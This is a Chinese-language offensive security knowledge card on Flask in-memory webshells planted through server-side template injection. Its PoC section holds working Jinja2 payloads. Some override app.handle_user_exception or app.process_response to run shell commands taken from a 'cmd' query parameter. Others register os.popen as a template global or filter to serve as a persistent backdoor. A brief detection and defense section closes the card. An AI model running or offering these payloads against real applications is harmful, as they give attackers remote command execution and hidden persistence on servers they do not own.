---
id: web-python-framework-flask-method-override-component-memshell
title: Flask 方法覆盖与组件注册型内存马：handle_user_exception/process_response/jinja_env
type: scenario
domain: web
path: web/python/framework
technique: flask-method-override-component-memshell
aliases:
- Flask 组件注册内存马
- handle_user_exception 覆盖
- process_response 覆盖
- jinja_env.globals 后门
- jinja_env.filters 后门
tags:
- web
- python
- flask
- ssti
- memshell
- persistence
- jinja2
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:04:12+08:00'
  notes: 已对照原文核对：handle_user_exception/process_response 为实例可替换方法，setattr 后分别在异常路径与响应收尾被调用，返回需 make_response/Response；jinja_env.globals/filters 可用 __setitem__ 写入 os.popen，{{shell('whoami').read()}} 与 {{('whoami'|cmd).read()}} 可回显。原文 Flask 3.1.0 环境，add_url_rule 与 error_handler_spec 未成功已按 skipped 处理。原文未涉及版本区间。PoC 未在本机执行。
---

## 一句话结论

拿到 Flask 内的 `eval` 后，除了挂钩子，还可以用 `setattr` 覆盖 `app.handle_user_exception`/`app.process_response` 等运行时方法，或向 `app.jinja_env.globals`/`filters` 写入命令执行函数；这些改动常驻进程内存，由框架在固定时机自动调用。

## 原理

- Flask 在每个请求的异常路径调用 `self.handle_user_exception(e)`，在响应返回前调用 `self.process_response(response)`。这两个都是实例属性上的可替换方法，攻击者用 `setattr(app, 'handle_user_exception', lambda ...)` 直接替换后，任意异常/任意响应都会走到恶意逻辑。
- `handle_user_exception` 的返回值必须是 Flask 能接受为响应的对象（`Response` 或可转换值）；用 `flask.make_response(...)` 包装命令输出即可回显，同时避免类型错误。触发点是任意异常，如除零、404、500。
- `process_response` 接收并必须返回 `Response`；可在其中 `response.set_data(cmd_output)` 改写响应体。
- `app.jinja_env.globals` 是 Jinja2 模板全局变量字典，`app.jinja_env.filters` 是过滤器字典。eval 中不能写 `dict[k]=v`，但可调用 `__setitem__(k, v)` 完成赋值；把 `os.popen` 写进去后，任意 SSTI 点可像内置函数/过滤器一样调用 `{{shell('whoami').read()}}`、`{{'whoami'|cmd}}`。
- 这些对象都属于运行期可变状态，不受 `@setupmethod` 限制（不是通过装饰器注册），因此第一个请求之后仍可修改；代价是只存在于当前进程，重启失效。

## 触发条件

- SSTI 或任意 `eval`/`exec`，可触达 `current_app`；
- `handle_user_exception`/`process_response` 型需要能触发异常或正常响应（几乎必然满足）；
- `jinja_env` 型需要存在模板渲染点（SSTI 本身即可）；
- 应用进程不重启；调试模式仅影响报错回显，不影响方法覆盖本身。

## 利用步骤

1. 通过 SSTI 拿到 `url_for.__globals__['__builtins__']['eval']` 与 `current_app`。
2. 选择覆盖点或组件：
   - 任意异常回显：覆盖 `handle_user_exception`；
   - 所有响应改写：覆盖 `process_response`；
   - 模板全局/过滤器后门：向 `jinja_env.globals`/`filters` 写 `os.popen`。
3. 用 `?cmd=` 动态传参（覆盖型）或在模板中调用后门（jinja_env 型）。
4. 访问任意路径/触发异常验证。

## PoC

覆盖 `handle_user_exception`（任意异常触发，`make_response` 保证返回类型）：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "setattr(app, 'handle_user_exception', lambda e: __import__('flask').make_response(__import__('os').popen(request.args.get('cmd','whoami')).read()))",
  {'app': url_for.__globals__['current_app'], 'request': url_for.__globals__['request']}
)}}
```

随后访问一个会抛异常的路径（如 `/?cmd=id` 触发除零或 404）。

覆盖 `process_response`：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "setattr(app, 'process_response', lambda response: (response.set_data(__import__('os').popen(request.args.get('cmd','whoami')).read()), response)[1])",
  {'app': url_for.__globals__['current_app'], 'request': url_for.__globals__['request']}
)}}
```

注册 Jinja 全局函数后门：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "app.jinja_env.globals.__setitem__('shell', __import__('os').popen)",
  {'app': url_for.__globals__['current_app']}
)}}
```

之后在任意模板点执行：

```jinja
{{shell('whoami').read()}}
```

注册过滤器后门：

```jinja
{{url_for.__globals__['__builtins__']['eval'](
  "app.jinja_env.filters.__setitem__('cmd', __import__('os').popen)",
  {'app': url_for.__globals__['current_app']}
)}}
```

使用：

```jinja
{{('whoami'|cmd).read()}}
```

## 变体与关联

- 覆盖 `app.wsgi_app`、`app.dispatch_request`、`app.full_dispatch_request` 等更底层方法也可实现全请求劫持，但影响面更大、更易导致服务异常。
- `jinja_env.globals` 后门对所有模板生效，适合已有 SSTI 但不想反复逃逸的场景；`filters` 后门用法更隐蔽。
- 与钩子注册表型内存马（`before_request_funcs` 等）互补：钩子是“加列表”，本卡是“换方法/加字典键”。
- 与 Java 内存马（Filter/Servlet/Agent）同样属于进程内持久化，重启即失效。

## 检测与防御

- 禁止 SSTI 与任意 `eval`/`exec`；这是所有内存马的前置条件。
- 生产关闭 debug，避免异常回显；但对方法覆盖型仅靠关闭 debug 不够，仍需阻断注入点。
- 运行期比对 `app.handle_user_exception`、`app.process_response` 是否为原始绑定方法；检查 `jinja_env.globals`/`filters` 是否出现 `os.popen`、`subprocess` 等异常值。
- 发现入侵后重启进程并轮换密钥；检查所有可能的覆盖点，避免只清理一处。
- 监控模板渲染参数中出现 `__globals__`、`__builtins__`、`__setitem__`、`setattr` 等特征。
